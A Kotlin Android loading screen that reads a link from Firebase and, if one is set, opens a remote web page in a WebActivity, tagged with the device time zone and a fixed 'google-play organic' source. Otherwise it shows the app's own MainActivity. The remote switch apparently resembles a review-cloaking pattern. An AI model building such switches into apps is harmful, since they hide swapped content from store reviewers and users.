package com.template

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.template.databinding.ActivityLoadingBinding
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.net.URLEncoder
import java.util.TimeZone
import java.util.UUID

class LoadingActivity : AppCompatActivity() {

    private lateinit var binding: ActivityLoadingBinding
    private lateinit var database: DatabaseReference
    private lateinit var firebaseAnalytics: FirebaseAnalytics

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted: Boolean ->
        if (isGranted) {
            Toast.makeText(
                this, "Notifications permission granted", Toast.LENGTH_SHORT
            )
                .show()
        } else {
            Toast.makeText(
                this@LoadingActivity, "Your app will not show notifications",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (getUrlFromPreferences().isNullOrEmpty() && networkAvailable()) {

            askNotificationPermission()

            firebaseAnalytics = Firebase.analytics

            database = Firebase.database.reference

            database.child("db").child("link").get().addOnSuccessListener {
                val value = kotlin.runCatching { it.value.toString() }.getOrNull()
                if (value.isNullOrEmpty()) {
                    startMainActivity()
                } else {
                    handleDomain(value)
                }
            }
        } else {
            startMainActivity()
        }
    }

    private fun startMainActivity() {
        val intent = Intent(this@LoadingActivity, MainActivity::class.java)
        startActivity(intent)
    }

    private fun startWebActivity(url: String) {
        val intent = Intent(this@LoadingActivity, WebActivity::class.java)
        intent.putExtra("url", url)
        startActivity(intent)
    }

    private fun handleDomain(domain: String) {

        val timeZone = URLEncoder.encode(TimeZone.getDefault().id)
        val url = "$domain/?packageid=$packageName" +
                "&usserid=${UUID.randomUUID()}" +
                "&getz=$timeZone" +
                "&getr=utm_source=google-play&utm_medium=organic"

        saveUrlToPreferences(url)

        val client = OkHttpClient()
        val userAgent = System.getProperty("http.agent")

        val request: Request = Request
            .Builder().url(url)
            .header("User-Agent", userAgent)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
                startMainActivity()
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        startWebActivity(url)
                    } else {
                        startMainActivity()
                    }
                }
            }
        })
    }

    private fun saveUrlToPreferences(url: String) {
        val preferences = getSharedPreferences("my_preferences", Context.MODE_PRIVATE)
        val editor = preferences.edit()
        editor.putString("url_key", url)
        editor.apply()
    }

    private fun getUrlFromPreferences(): String? {
        val preferences = getSharedPreferences("my_preferences", Context.MODE_PRIVATE)
        return preferences.getString("url_key", null)
    }

    private fun networkAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    companion object {

        const val ERROR = 403
    }

    private fun askNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this, Manifest.permission.POST_NOTIFICATIONS
                ) ==
                PackageManager.PERMISSION_GRANTED
            ) {
                // FCM SDK and your app can post notifications.
            } else if (shouldShowRequestPermissionRationale(
                    Manifest.permission.POST_NOTIFICATIONS
                )
            ) {
                TODO()
            } else {
                requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }
}
